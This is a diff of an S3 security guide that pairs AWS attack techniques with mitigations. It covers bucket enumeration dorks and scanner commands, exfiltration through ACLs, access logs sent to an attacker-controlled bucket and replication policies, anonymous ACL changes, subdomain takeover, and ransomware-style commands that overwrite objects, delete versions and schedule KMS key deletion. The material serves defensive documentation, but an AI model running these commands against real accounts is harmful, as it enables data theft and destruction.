@@ -17,112 +17,40 @@ data.
 
 ## Attacks
 
-### Data Exfiltration
-
-Data exfiltration is a type of security breach that leads to the unauthorized transfer of sensitive data from the compromised S3 bucket to external endpoints.
-
-After identifying misconfigured S3 buckets often achieved through Bucket Enumeration, an attacker can find and exploit vulnerabilities in the S3 bucket by analyzing the security measures applied to the bucket. If the attacker gains unauthorized access to the bucket, he can use data exfiltration methods to transfer sensitive data.
-
-**Types of data exfiltration attacks and how do they happen**
-After attackers successfully target misconfigured S3 Buckets, data exfiltration takes place.
-Some of the ways are described in the following.
-
-#### Misconfigured ACL
-If the bucket has misconfigured ACL(Access Control Lists) permissions, you can use this command to download data from an S3 bucket to your local system. 
- ```
-    aws s3 sync s3://<bucket>/<path> </local/path>
- ```
-
-#### EC2 Metadata IP
-AWS provides instance metadata for EC2 instances via a private HTTP interface only accessible to the virtual server itself. While this does not have any significance from an external perspective, it can however be a valuable feature to leverage in SSRF-related attacks. The categories of metadata are exposed to all EC2 instances via the following URL: http://169.254.169.254/latest/meta-data/
-
-#### Leaked Keys
-Attackers may stumble on leaked AWS Client ID and Client Secret Keys on Github, and Gitlab. If an attacker gets access to the keys associated with an Amazon Relational Database (RDS) and takes snapshots of these resources, they can deploy a new RDS database based on the snapshot. And when they do that they get to reset the passwords associated with the database. So now they’ve got access to all of your data without actually having to have the passwords required on the RDS instance. It’s the same case with the EBS (Elastic Block Store) snapshot. For example, assuming they’re able to create an SSH key pair in your account, they could launch a new instance from the snapshot and assign their key pair to the instance, giving them full access to the data of the original instance. If they can’t create SSH keys in your account, they might try to mount the snapshot to an existing instance they can already access. 
-
-#### Unsecured EC2 Instances
-EC2 instances running data storage services like Elasticsearch and MongoDB, which by default don’t have any credential requirements to interact with the data store also add up to one of the common issues that lead to data exfiltration. If the security groups are not set up properly you can inadvertently expose, for example, the Elasticsearch port (9200) out to the Internet. If that happens, you can bet that somebody is going to find it and dump its entire data set. It’s become so common that adversaries have gone through the trouble of creating ransomware that fully hijacks the data store and encrypts the data within it. To find publicly exposed Elasticsearch databases, an attacker will use the following dork on Shodan; <br>
-port:”9200″ elastic
-
-#### Application abuse
-A crafty attacker will bang on a web application long enough to find a vulnerability that they can use to exfiltrate data from the system. This technique is very effective because most web applications need access to some degree of sensitive data to be of any use. A good example is the Facebook Data breach where three software flaws in Facebook’s systems allowed hackers to break into user accounts. 
-
-### Mitigates
-
-#### Acces Control
-As mentioned in the previous attack, it is essential to pay attention to configurations such as setting up IAM user policies, S3 bucket policies, VPC (Virtual Private Cloud) endpoint policies, and SCPs (AWS Organizations Service Control Policies).  
-
-A majority of modern use cases in Amazon S3 no longer require the use of ACLs, and it is recommended to keep ACLs disabled except in unusual circumstances where it is needed to control access for each object individually.
-With ACL disabled, it is recommended to use the policies mentioned above.
-
-#### Keep buckets not publicly accessible
-
-Unless you explicitly require anyone on the internet to be able to read or write to your S3 bucket, make sure that your S3 bucket is not public. Some of the ways to block public access are:
-**Use S3 Block Public Access**
-This sets up centralized control to limit public access to S3 resources, regardless of how the resources are created.
-**Identify policies that allow wildcard identity and wildcard action**
-Wildcard Identity (example: "Principal": "*") means that anyone can access resources. Also, Wildcard Action means that the user can perform any action with targeted resources. After identifying, those needs to be avoided by any cost, unless there is specific logic that requires those.
-**Implementing ongoing detective controls** 
-Consider implementing ongoing detective controls by using the s3-bucket-public-read-prohibited and s3-bucket-public-write-prohibited managed AWS Config Rules.
-
-Also, it is important to use tools, such as AWS Trusted Advisor, to inspect Amazon S3 implementation.
-
-#### Implement least privilege access
-It is recommended to grant only permissions that are required to perform a task. Implementing least-privilege access is fundamental in reducing security risk and the impact that could result from errors or malicious intent.
-Amazon S3 actions and Permissions Boundaries for IAM Entities, 
-Bucket policies and user policies, Access control list (ACL) overview, and Service Control Policies are tools for implementing least privilege access.
-
-#### IAM roles
-Its recommended to avoid storing AWS credentials directly in the application or Amazon EC2 instance. These are long-term credentials that are not automatically rotated and could have a significant business impact if they are compromised. 
-
-Instead, use an IAM role to manage temporary credentials for applications or services that need to access Amazon S3.
-
-When you use a role, you don't have to distribute long-term credentials (such as a username and password or access keys) to an Amazon EC2 instance or AWS service, such as AWS Lambda. The role supplies temporary permissions that applications can use when they make calls to other AWS resources.
-
-#### Encrypt Sensitive Data
-For protecting data at rest, and reducing the risk of unauthorized access to sensitive data can be used server-side encryption, as mentioned earlier.
-**Server-side encryption** with Amazon S3 managed keys (SSE-S3) is the default encryption configuration for every bucket in Amazon S3. To use a different type of encryption, you can either specify the type of server-side encryption to use in your S3 PUT requests, or you can set the default encryption configuration in the destination bucket. Server-side encryption options that Amazon S3 provides are Server-side encryption with AWS Key Management Service (AWS KMS) keys (SSE-KMS), Dual-layer server-side encryption with AWS Key Management Service (AWS KMS) keys (DSSE-KMS), Server-side encryption with customer-provided keys (SSE-C). 
-**Client-side encryption** needs a developer to manage the encryption process, the encryption keys, and related tools. manage the encryption process, the encryption keys, and related tools. There are many Amazon S3 client-side encryption options.
-
-####  Encryption of data in transit
-HTTPS (TLS) is recommended to use, to help prevent potential attackers' encryption of data in transit. It is recommended to allow only encrypted connections over HTTPS (TLS) by using the was: SecureTransport condition in your Amazon S3 bucket policies.
-
-#### "Write Once Read Many" model
-With S3 Object Lock, you can store objects by using a WORM model. S3 Object Lock can help prevent accidental or inappropriate deletion of data.
-S3 Object Lock can be used to help protect your AWS CloudTrail logs.
-
-#### Enable Logging and Monitoring
-Analyzing CloudTrail logs can be used to identify and respond to data exfiltration attempts by monitoring S3 data events, and analyzing logs for unauthorized object copies.
-
-#### Consider using VPC endpoints for Amazon S3 access
-A virtual private cloud (VPC) endpoint for Amazon S3 is a logical entity within a VPC that allows connectivity only to Amazon S3. VPC endpoints provide multiple ways to control access to your S3 bucket and help prevent traffic from traversing the open internet.
-
 
 ### Bucket Enumeration
 
 Bucket enumeration is a process of identifying misconfigured S3 buckets that are publicly accessible. This process can be used as a part of security analysis, or for malicious intent, to determine which objects are present within a given bucket. When an attacker successfully performs S3 bucket enumeration on misconfigured buckets, they can potentially gain access to various types of sensitive data depending on what is stored in those buckets.
-Several methods can be used for finding S3 buckets. 
-
-The attacker will target a misconfigured bucket. Some of the ways to locate them are by using Google Dorks, AWS CLI tools, CLI tools from Github, and websites.
+Several methods can be used for finding S3 buckets:
+- Google Dorking
+- AWS CLI
+- Third-Party tools - S3Scanner, AWSBucketDump, CloudMapper
+- Websites
 
 #### Using Google Dorks to find S3 buckets
 Google Dorks are powerful search queries that allow you to find specific information on the internet. <br>
 Google Dorking, also known as Google hacking, can return information difficult to locate through simple search queries. This includes information not intended for public viewing, but that is inadequately protected and can, therefore, be "dorked" by a hacker.
 
-You can use Google Dorks to discover S3 buckets associated with Amazon Web Services. Here are a couple of examples: 
+You can use Google Dorks to discover S3 buckets. Here are a couple of examples: 
 
-**site:http://amazonaws.com inurl:".s3.amazonaws.com/"**
-1. site:http://amazonaws.com: This part restricts the search to the domain "amazonaws.com." The site: operator is used to specify a particular domain or site where the search should be performed.
-2. inurl:".s3.amazonaws.com/": This part of the query focuses on the URL structure. The inurl: operator is used to search for a specific string within the URL. In this case, it looks for URLs containing ".s3.amazonaws.com/". The . before "s3" is used to ensure that it is a specific part of the URL and not just any occurrence of "s3."
+- **site:http://amazonaws.com inurl:".s3.amazonaws.com/"**
+   - site:http://amazonaws.com: This part restricts the search to the domain "amazonaws.com." The site: operator is used to specify a particular domain or site where the search should be performed.
+   - inurl:".s3.amazonaws.com/": This part of the query focuses on the URL structure. The inurl: operator is used to search for a specific string within the URL. In this case, it looks for URLs containing ".s3.amazonaws.com/". The . before "s3" is used to ensure that it is a specific part of the URL and not just any occurrence of "s3."
 
-**site:http://s3.amazonaws.com intitle:index.of.bucket** 
-1. site:http://s3.amazonaws.com: This restricts the search to the specified site, in this case, http://s3.amazonaws.com. It specifies that the search should focus on Amazon S3 buckets hosted on the Amazon Web Services (AWS) S3 domain.
-2. intitle:index.of.bucket: This part of the query focuses on the title of the web pages. It's looking for pages that have the words "index" and "of" in the title and the word "bucket" in the content. This is a common pattern for the default index pages of open S3 buckets, which might expose the contents of the bucket.
+- **site:http://s3.amazonaws.com intitle:index.of.bucket** 
+   - site:http://s3.amazonaws.com: This restricts the search to the specified site, in this case, http://s3.amazonaws.com. It specifies that the search should focus on Amazon S3 buckets hosted on the Amazon Web Services (AWS) S3 domain.
+   - intitle:index.of.bucket: This part of the query focuses on the title of the web pages. It's looking for pages that have the words "index" and "of" in the title and the word "bucket" in the content. This is a common pattern for the default index pages of open S3 buckets, which might expose the contents of the bucket.
 
 #### Using AWS CLI tools find S3 buckets
 After creating an AWS account and successfully installation and configuring AWS CLI, AWS CLI commands can be used to interact with S3 Buckets. 
 Some of the examples:
 
-**List all Files in an S3 Bucket with AWS CLI** <br>
+**List all Files in an S3 Bucket with AWS CLI**
+
+To list all s3 buckets use following command:
+```
+   aws s3 ls
+```
 To list all of the files of an S3 bucket with the AWS CLI, use the s3 ls command, passing in the --recursive parameter.
  ```
     aws s3 ls s3://YOUR_BUCKET --recursive --human-readable --summarize
@@ -144,77 +72,227 @@ To list all files, located in a folder of an S3 bucket, use the s3 ls command, p
 
 The output of the command only will show the files in the /my-folder-1 directory.
 
+**Examine Permissions**
 
-
-**List only the Filenames of an S3 Bucket**
-To only list the filenames of an S3 bucket, we have to: 
-1. Use the s3api list-objects command.
-2. Set the --output parameter to text.
-3. Use the --query parameter to filter the output of the command.
-
- ```
-    aws s3api list-objects --bucket YOUR_BUCKET --output text --query "Contents[].{Key: Key}"
+To list bucket policies and access control lists (ACLs):
 ```
-
-The output of the command will show all the filenames, or in other words, path names in the S3 bucket.
-
-
-To list only the filenames in a specific folder, add the --prefix parameter to the command:
- 
- ```
-    aws s3api list-objects --bucket YOUR_BUCKET --prefix "my-folder/" --output text --query "Contents[].{Key: Key}"
- ```
-Output to a file can be redirected to the local file system, using the command: <br>
-
- ```
-    aws s3api list-objects --bucket YOUR_BUCKET --prefix "my-folder-1/" --output text --query "Contents[].{Key: Key}" > file-names.txt
- ```
-
-#### Using CLI tools from GitHub to find S3 buckets
-GitHub hosts a range of online tools that aid in finding S3 buckets associated with a website. Some of the tools are Slurp, Bucket_finder, S3Scanner, Cloudlist, Lazy S3, Dumpster Diver, and many more. The main purpose of these tools is to find buckets, scan them, and dump their data. 
+   aws s3api get-bucket-policy --bucket BUCKET-NAME aws s3api get-bucket-acl --bucket BUCKET-NAME
+```
 
 #### S3Scanner
 S3Scanner uses a list of entries to digest. With this list, it will try to find available S3 buckets. Several formats can be used (bucket name, domain name, full S3 URL, or bucket:region).
+Following image shows example of command to run tool with the desired target domain.S3Scanner will scan for publicly accessible buckets and display the results, including bucket names and associated URLs.
+
+![Alt text](/documentation/images/s3scanner.png)
 
 
-**Examples**
-1. Scan AWS buckets listed in a file with 8 threads: 
+Examples
+
+ Scan AWS buckets listed in a file with 8 threads: 
  ```
     $ s3scanner --threads 8 scan --buckets-file ./bucket-names.txt
  ```
-2. Scan a bucket in Digital Ocean Spaces: 
+Scan a bucket in Digital Ocean Spaces: 
  ```
     $ s3scanner --endpoint-url https://sfo2.digitaloceanspaces.com scan --bucket my-bucket
  ```
-3. Dump a single AWS bucket: 
+Dump a single AWS bucket: 
  ```
     $ s3scanner dump --bucket my-bucket-to-dump
  ```
-4. Scan a single Dreamhost Objects bucket that uses the host address style and an invalid SSL cert: 
+Scan a single Dreamhost Objects bucket that uses the host address style and an invalid SSL cert: 
  ```
     $ s3scanner --endpoint-url https://objects.dreamhost.com --endpoint-address-style host --insecure scan --bucket my-bucket
 ```
 
 #### Finding S3 Buckets Using Websites
-Several websites offer services to discover open S3 buckets and other cloud storage repositories. One such website is: https://buckets.grayhatwarfare.com/results/colliershouston <br>
+Several websites offer services to discover open S3 buckets and other cloud storage repositories. Such website: [grayhatwarfare](https://buckets.grayhatwarfare.com/).
 By searching for an organization's name, you can filter and browse through the contents of their open S3 buckets.
 
 
 ### Mitigates
-#### Limit Public Access: 
+#### Public Access Controll: 
 - Apply S3 Block Public Access settings to prevent accidental public exposure of data, ensuring that only authorized users have access. 
+- To examine available S3 bucket S3 Block Public Access feature configuration Run get-public-access-block command.
+   ```
+   aws s3api get-public-access-block --bucket cc-internal-data --query 'PublicAccessBlockConfiguration'
+  ```
+  - If the feature was never enabled on the selected bucket command output returns following message:
+   ```
+   An error occurred (NoSuchPublicAccessBlockConfiguration)when calling the GetPublicAccessBlock operation: The public access block configuration was not found.
+   ```
+   - If the S3 Block Public Access feature is not currently enabled command output returns false for each supported setting:
+   ```
+      {
+         "BlockPublicAcls": false,
+         "IgnorePublicAcls": false,
+         "BlockPublicPolicy": false,
+         "RestrictPublicBuckets": false
+      }
+   ```
+- To reconfigure S3 bucket run:
+   ```
+   aws s3api put-public-access-block --region us-east-1 --public-access-block-configuration BlockPublicAcls=true IgnorePublicAcls=true,BlockPublicPolicy=true RestrictPublicBuckets=true --bucket cc-internal-data
+   ```
 
 #### Implement access control:   
-- Use bucket policies that define who can access the bucket and what actions they can perform.  
-- Implement Least Privilege: Apply strict IAM policies to users, groups, and roles.
+- Use bucket policies that define who can access the bucket and what actions they can perform. Example of S3 bucket policy that grants the root user of the AWS account with ID 112233445566 and the user named Tom full access to the S3 bucket.
+   ```
+   {
+   "Id": "Policy1586088133829",
+   "Version": "2012-10-17",
+   "Statement": [
+      {
+         "Sid": "Stmt1586088060284",
+         "Action": "s3:*",
+         "Effect": "Allow",
+         "Resource": "arn:aws:s3:::test-sample-bucket",
+         "Principal": {
+         "AWS": [
+            "arn:aws:iam::112233445566:root",
+            "arn:aws:iam::112233445566:user/Tom"
+         ]
+         }
+      }
+   ]
+   }
+   ```
+- Implement Least Privilege: Apply strict IAM policies to users, groups, and roles. IAM policies specify which actions are allowed or denied on AWS services/resources for a particular user. Example of policy that allows reading access to the s3 bucket. Any user group or role with the below policy attached will be able to read data from this bucket.
+   ```
+   {
+   "Version": "2012-10-17",
+   "Statement": [
+      {
+         "Sid": "VisualEditor0",
+         "Effect": "Allow",
+         "Action": ["s3:GetObject", "s3:GetObjectVersion"],
+         "Resource": "arn:aws:s3:::test-sample-bucket"
+      }
+   ]
+   }
+   ```
 - Use Object-Level Access Control: If it is required to manage permissions for each object within a bucket independently use ACLs (Access Control Lists) that are applied at the object level.
 - A bucket becomes vulnerable to this type of attack when it is made public, and for this reason, this practice should be avoided.
 
 #### Enable Logging and Monitoring: 
 - Enable access logging for S3 buckets and integrate them with AWS CloudTrail. This helps you monitor and detect any unauthorized access attempts or suspicious activities. Specifically, CloudTrail can be used to detect actions for enumerating the contents of S3 bucket, monitoring changes in bucket policies, and tracking user activities.
 
-#### Encrypt Sensitive Data:
-- After public buckets are found, the attacker can see the data inside the bucket. Use server-side encryption so Amazon S3 will encrypt objects before saving them and then decrypts the objects when downloading them.
+#### Encryption Of Data At Rest:
+- After public buckets are found, the attacker can see the data inside the bucket. For protecting data at rest, use of server-side encryption on Amazon S3 will encrypt objects before saving them and then decrypts the objects when downloading them.
+- In Server-side encryption, the data is encrypted after being sent to the S3 bucket and before storing it in the S3 bucket.
+Server-side encryption has the following three options:
+   - Use Amazon S3-managed keys (SSE-S3). In this, the key material and the key will be provided by AWS itself to encrypt the objects in the S3 bucket.
+   - Use CMK (Customer Master key) in AWS KMS (SSE-KMS). In this, key material and the key will be generated in AWS KMS service to encrypt the objects in S3 bucket.
+   - Use a Customer provided encryption key (SSE-C). In this, the key will be provided by the customer and Amazon S3 manages the encryption and decryption process while uploading/downloading the objects into the S3 bucket.
+
+- In Client-side encryption, the data is encrypted before sending it to the S3 bucket. To implement Client-side encryption in S3, we have the following two options:
+   - Use a CMK (customer master key) stored in AWS KMS (Key Management Service)
+   - Use a Customer provided master key stored in the customer’s proprietary application
+
+
+### Data Exfiltration
+
+Data exfiltration is a type of security breach that leads to the unauthorized transfer of sensitive data from the compromised S3 bucket to external endpoints.
+
+The attacker first identifies an AWS S3 bucket that could potentially be the target of the attack and then uses Bucket Enumeration tactics like Google dorks, to find S3 buckets associated with a specific website (command: site:s3.amazonaws.com <site.com>). This search is conducted through the Google search engine to identify potential target buckets. Another method involves using CLI tools for bucket enumeration, such as previously mentioned S3Scanner or scripts like AWSBucketDump. These tools assist in identifying available buckets by accessing information about their configurations and contents.
+
+**Data Exfiltration through misconfigured ACL**
+
+Attacker can check if there are configurations that could lead to an attack. To view permissions, the following command is used:
+```
+ aws s3api get-bucket-acl --bucket <bucket-name> --output json
+```
+
+Next attacker can use the following command, to list all files and directories in the given bucket:
+```
+ aws s3 ls s3://<bucket-name>
+```
+Now if the bucket has misconfigured ACL(Access Control Lists) permissions, following command can be used to download data from an S3 bucket to your local system. 
+ ```
+    aws s3 sync s3://<bucket>/<path> </local/path>
+ ```
+
+**Data Exfiltration through S3 Server Access Logs**
+
+Another way of data exfiltration attack can be peroformed if attaker have control over an IAM identity that allows s3:GetObject, depending on the network access to the S3 service, attacker can use S3 server access logs to a bucket that he controls, and use it to exfiltrate data.
+
+With server access logging, every request to our S3 bucket will be logged to a separate logging bucket. This includes internal AWS requests, or requests made via the AWS console. Even if a request is denied, the payload that the request is carrying, will be sent to our logging bucket. Attacker can then send GetObject requests to s3 buckets, that we don't have access to, but because attacker controls the server access logs, he will still receive the exfiltrated data.
+
+Attacker can create an S3 bucket with server access logging. With our data in hand ExampleDataToExfiltrate, send GetObject request will be send to our bucket, for example:
+```
+aws s3api get-object --bucket AttackerBucket --key ExampleDataToExfiltrate
+```
+The request will be denied. However the attempt along with the other details, including our key ExampleDatatoExfiltrate - which is the data that attacker is trying to exfiltrate - will arrive to logging bucket AttackerBucketLogs. Data will be received in the format below. Attacker can exfiltrate data, using the Key parameter of the request.
+```
+[..] attackerbucket […] 8.8.8.8 – […] REST.GET.OBJECT ExampleDataToExfiltrate "GET / ExampleDataToExfiltrate HTTP/1.1" 403 AccessDenied 243 - 18 - "-" "UserAgentAlsoHasData " – […]
+```
+
+**Exfiltrating S3 Data with Bucket Replication Policies**
+S3 data replication provides the ability to copy objects to another. This can be done between buckets in the same account, or an unrelated account. In this type of attack attacker could input a replication policy to copy objects to bucket controlled by him. Objects will continue to be replicated for as long as the policy in place, applying to all future objects placed into the bucket. Using S3 batch operations, attackers can also replicate objects already in the bucket, making it a convenient method for extracting all current and future objects uploaded to the impacted bucket.
+
+Required Configurations and Permissions for attack to be executed:
+- The source bucket owner must have the source and destination AWS Regions enabled for their account. For the destination account, just the destination region needs to be enabled.
+- Both source and destination buckets must have versioning enabled.
+- If the source bucket has S3 Object Lock enabled, the destination buckets must also have S3 Object Lock enabled.
+- Minimum Required IAM Permissions in Source Account - that attacker must have are: 
+   - iam:CreateRole (creating a new role)
+   - iam:CreatePolicy & iam:AttachRolePolicy (creating a new policy) or iam:PutRolePolicy (modifying an existing policy)
+   - iam:UpdateAssumeRolePolicy
+- If objects are encrypted minimum required IAM Permission in Source Account must be kms:PutKeyPolicy. 
+- Minimum Required IAM Permissions in Destination Account are s3:PutBucketPolicy, kms:CreateKey kms:PutKeyPolicy, s3:PutBucketVersioning
+- In order for a bucket to receive logs from another account, it requires a bucket policy explicitly allowing the replication of objects across.
+### Mitigates
+
+#### Acces Control and Public Access
+- As mentioned in the previous attack, it is essential to pay attention to configurations such as setting up IAM user policies, S3 bucket policies.
+- A majority of modern use cases in Amazon S3 no longer require the use of ACLs, and it is recommended to keep ACLs disabled except in unusual circumstances where it is needed to control access for each object individually.
+With ACL disabled, it is recommended to use the policies mentioned above.
+- Keep S3 bucket private.
+- Apply least privilege on IAM and bucket policies.
+
+
+#### Encryption Of Data At Rest
+- As mentioned in previous attack it is important to encrypt data is S3 bucket, to protecting data at rest, and reducing the risk of unauthorized access
+- Use server and client side encryption.
+
+####  Encrypt data in transit
+- HTTPS (TLS) is recommended to use, to help prevent potential attackers' encryption of data in transit. It is recommended to allow only encrypted connections over HTTPS (TLS) by using the was: SecureTransport condition in your Amazon S3 bucket policies.
+This example bucket policy complies with the s3-bucket-ssl-requests-only rule. This policy explicitly denies all actions on the bucket and objects when the request meets the condition "aws:SecureTransport": "false":
+   ```
+   {
+   "Id": "ExamplePolicy",
+   "Version": "2012-10-17",
+   "Statement": [
+      {
+         "Sid": "AllowSSLRequestsOnly",
+         "Action": "s3:*",
+         "Effect": "Deny",
+         "Resource": [
+         "arn:aws:s3:::DOC-EXAMPLE-BUCKET",
+         "arn:aws:s3:::DOC-EXAMPLE-BUCKET/*"
+         ],
+         "Condition": {
+         "Bool": {
+            "aws:SecureTransport": "false"
+         }
+         },
+         "Principal": "*"
+      }
+   ]
+   }
+   ```
+
+#### "Write Once Read Many" model
+- With S3 Object Lock, you can store objects by using a WORM model. S3 Object Lock can help prevent accidental or inappropriate deletion of data.
+S3 Object Lock can be used to help protect your AWS CloudTrail logs.
+
+#### Enable Logging and Monitoring
+- Analyzing CloudTrail logs can be used to identify and respond to data exfiltration attempts by monitoring S3 data events, and analyzing logs for unauthorized object copies.
+- To protect from bucket replication look for unknown PutBucketReplication or JobCreated events in the Cloudtrail Management trail. The JobCreated event is generated when an S3 Batch operation job has been created, indicating that all existing objects in a bucket are being replicated across, as opposed to only future S3 objects.
+- Also Cloudtrail Management trail records unknown PutBucketVersioning events (a pre-requisite of bucket replication) on existing S3 buckets.
+
+#### Consider using VPC endpoints for Amazon S3 access
+- A virtual private cloud (VPC) endpoint for Amazon S3 is a logical entity within a VPC that allows connectivity only to Amazon S3. VPC endpoints provide multiple ways to control access to your S3 bucket and help prevent traffic from traversing the open internet.
 
 ### Abuse of Bucket Permissions
 Aabuse of S3 bucket permissions refers to instances where the configuration and permissions of buckets are not properly managed, leading to security vulnerabilities, including unauthorized access, data exposure, and data leakage.
@@ -223,7 +301,10 @@ After identifying S3 buckets using Bucket Enumeration, attacker can test permiss
 
 ![Alt text](images/T5.png)
 
+Each S3 bucket has an ACL attached to it. These ACLs can be configured to provide an AWS account or group access to an S3 bucket. There are four types: read, write, read_acp, write_acp.
+
 **READ Permission**
+
 This permission allows reading the contents of the bucket. At the object level, it allows reading the contents as well as metadata of the object. 
 Testing this can be done by accessing it via URL http://[name_of_bucket].s3.amazonaws.com. This same thing can be done by using the AWS CLI as well.
  ```
@@ -234,6 +315,7 @@ This image shows resoult of souch commands.
 ![Alt text](/documentation/images/read.png)
 
 **WRITE Permission**
+
 This permission allows to create, overwrite, edit and delete objects in a bucket. This permission can be tested by the AWS CLI, with following command.
  ```
     aws s3 cp localfile s3://[name_of_bucket]/test_file.txt –-no-sign-request
@@ -242,6 +324,7 @@ A bucket that allows unrestricted file upload will show a message that the file 
 ![Alt text](/documentation/images/write.png)
 
 **READ_ACP**
+
 At bucket, level allows to read the bucket’s Access Control List and at the object level allows to read the object’s Access Control List.
  ```
     aws s3api get-bucket-acl --bucket [bucketname] --no-sign
@@ -251,6 +334,7 @@ Once we execute both these commands, they will output a JSON describing the ACL 
 ![Alt text](/documentation/images/readacp.png)
 
 **WRITE_ACP**
+
 This policy at the bucket level allows setting access control list for the bucket. At the object level, allows setting access control list for the objects.
  ```
     aws s3api put-bucket-acl --bucket [bucketname] [ACLPERMISSIONS] --no-sign-request
@@ -258,8 +342,15 @@ This policy at the bucket level allows setting access control list for the bucke
     aws s3api put-object-acl --bucket [bucketname] --key file.txt [ACLPERMISSIONS] --no-sign-request
  ```
 
+**FULL_CONTROLL**
 
-## Mitigates
+This grants full control (READ,WRITE,READ_ACP, WRITE_ACP). 
+This permission allows any authenticated AWS client to to perform any action on the specified S3 bucket
+```
+   aws s3api put-object-acl --bucket [bucketname] --key file.txt [ACLPERMISSIONS] –profile [your_profile_name]
+```
+
+### Mitigates
 
 #### Bucket policies:
 - Administrators should set each and every permission/Action manually as per requirement and configure the bucket properly such that public access is blocked.
@@ -274,7 +365,7 @@ This policy at the bucket level allows setting access control list for the bucke
                 "Principal": {
                     "AWS": ""
                 },
-                "Action": "",
+                "Action": "*",
                 "Resource": [
                     "arn:aws:s3:::temp4blog",
                     "arn:aws:s3:::temp4blog/*"
@@ -300,12 +391,11 @@ The attacker has the ability to access, manipulate data, and take control of the
 ### Subdoman takeover - Bucket takeover
 Sub domain Takeover attack is when an attacker is able to gain control of a company’s subdomain hosted on a cloud service such as AWS, github etc. because of the DNS entries pointing to that service is not being removed. This allows attacker to set up a phishing page on that sub-domain or serve malicious content.
 
-Subdomain takeover in amazon s3: Each bucket pointing to a specific domain or subdomain. So sometimes, when s3 buckets is no longer in use customer delete them from their account, but forgets to remove the DNS entry pointing to that subdomain it may escalate to a subdomain takeover because amazon allow non existing bucket names to be claimed again on any other account.
+**Subdomain takeover in amazon S3**
 
-Since Amazon S3 buckets’ contents can be retrieved over HTTP, they can be used to store and serve static assets such as images, videos, stylesheets, user upload content, or complete static websites. An S3 bucket is accessed by, for example URL our.company.com.s3-website.ap-south-1.amazonaws.com”. Organizations tend to create custom subdomains like “our.company.com”. Custom subdomains are created by adding DNS CNAME record like the one below:
+Each bucket pointing to a specific domain or subdomain. So sometimes, when s3 buckets is no longer in use customer delete them from their account, but forgets to remove the DNS entry pointing to that subdomain it may escalate to a subdomain takeover because amazon allow non existing bucket names to be claimed again on any other account.
 
-Type	    Name Content	                                    TTL	
-CNAME blog	our.company.com.s3-website-us-east-1.amazonaws.com	3000
+Since Amazon S3 buckets’ contents can be retrieved over HTTP, they can be used to store and serve static assets such as images, videos, stylesheets, user upload content, or complete static websites. An S3 bucket is accessed by, for example URL our.company.com.s3-website.ap-west-1.amazonaws.com”. Organizations tend to create custom subdomains like “our.company.com”. Custom subdomains are created by adding DNS CNAME.
 
 Later when this bucket is deleted from AWS S3, we still have the DNS record pointing to the bucket URL: since it wasn’t removed, it now points to a bucket that doesn’t exist anymore.In such a case, pointing the browser to blog.char49.com would return a page like the one below:
 ![Alt text](/documentation/images/bucketNotFound.png)
@@ -338,13 +428,10 @@ Now when someone acces login page, this webpage is being served from our domain 
 - As mentioned in the previous attacks, it is always essential to pay attention to configurations such as setting up IAM user policies and S3 bucket policies, and implement principle of Least-Privilege.
 
 #### DNS records examination:
-- It is my recommendation that developers or IT engineers examine their organization’s DNS records every time there is a termination of a S3 bucket. This will ensure there are no DNS/CNAME entries that point to non-existent S3 buckets which could potentially be exploited.
+- It is recommendation that organization’s DNS records be examined every time there is a termination of a S3 bucket. This will ensure there are no DNS/CNAME entries that point to non-existent S3 buckets which could potentially be exploited.
 
 #### Monitor subdomains:
 - Regularly monitor subdomains to ensure taht they are pointing to the correct S3 bucket.
-
-
-
 
 ## Threat - Data Manipulation/Corruption 
 Target resource - S3 bucket and it's data.
@@ -358,12 +445,16 @@ Attackers can exploit vulnerabilities to maliciously modify information, comprom
 Ransomware Attack is when an attacker gains access to a victim’s system and encrypts the sensitive data on it. This is accompanied by a threat to delete or publicly release the data.
 The most straightforward way for an attacker to perform ransomware on a bucket is by gaining access to, copying and deleting the information in the bucket -- or otherwise denying access to it to anyone else. Instead of storing the data in its own account, the attacker can encrypt the data locally and store it on the compromised bucket in the victim’s environment.
 
-This attack method has four types of combinations that are interesting to distinguish between: data deletion when versioning is not enabled, data deletion when it is, deleting a KMS(AWS Key Management Service) key used to encrypt the bucket (should the bucket be encrypted with a KMS key) and deleting the information on the bucket using lifecycle rules. Each of those methods requires the ability to access the information in the bucket first what would include performing the following functions:  
-• Listing the objects in the buckets with the s3:ListBucket permission granted to a specific identity or, if the bucket is open for use publicly, by its ACL  
-• If the bucket is KMS encrypted, decrypting the information on the bucket using kms:Decrypt on the KMS key with which it is encrypted  
-• Reading the contents of the objects using s3:GetObject   
+This attack method has four types of combinations that are interesting to distinguish between: data deletion when versioning is not enabled, data deletion when it is, deleting a KMS(AWS Key Management Service) key used to encrypt the bucket (should the bucket be encrypted with a KMS key) and deleting the information on the bucket using lifecycle rules. 
 
-#### Data Deletion When Versioning Is Not Enabled  
+![Alt text](/documentation/images/ransomware.png)
+
+Each of those methods requires the ability to access the information in the bucket first what would include performing the following functions:  
+- Listing the objects in the buckets with the s3:ListBucket permission granted to a specific identity or, if the bucket is open for use publicly, by its ACL  
+- If the bucket is KMS encrypted, decrypting the information on the bucket using kms:Decrypt on the KMS key with which it is encrypted  
+- Reading the contents of the objects using s3:GetObject   
+
+**Data Deletion When Versioning Is Not Enabled**  
 When the bucket does not have versioning enabled on it, it’s enough to be able to delete an 
 object using s3:DeleteObject. Another way is by overwriting it with a different value, possibly ciphertext generated by encrypting the original data locally using s3:PutObject or by the bucket being public for overwriting due to its ACL. 
 
@@ -391,7 +482,8 @@ For overwriting files attacker can create a blank file and systematically replac
       rm emptyfile.txt objects.txt
  ```
 
-#### Data Deletion When Versioning Is Enabled  
+**Data Deletion When Versioning Is Enabled**
+
 If versioning is enabled, the attacker would have to have access to functions for listing all the 
 versions using s3:ListBucketVersions or by means of the bucket being public for listing due to 
 its ACL. It would then need to be able to perform s3:DeleteObjectVersion so it can remove all 
@@ -411,7 +503,7 @@ Command to delete remaining backups
     done
 ```
 
-#### KMS Key Deletion  
+**KMS Key Deletion**  
 If the bucket is KMS encrypted, there’s another way the attacker can make the objects in the bucket unavailable. If it can successfully delete the KMS key with which the objects were encrypted, there is no way for anyone to decrypt the bucket. To do so, the attacker will need to have permissions to perform kms:ScheduleKeyDeletion on the KMS key in question. 
 
 Command for scheduling key deletion
@@ -419,7 +511,7 @@ Command for scheduling key deletion
     aws kms schedule-key-deletion --key-id <new-key-id>
  ```
 
-#### Managing Lifecycle Configuration  
+**Managing Lifecycle Configuration**  
 S3 buckets have a very useful mechanism for managing “Lifecycle Rules” by performing actions, such as transitioning versions of objects between storage classes, automatically expiring current versions of an object and permanently deleting previous versions of a bucket. Combining the ability to expire an object and then have it permanently deleted is potent. A attacker that gains the ability to configure lifecycle 
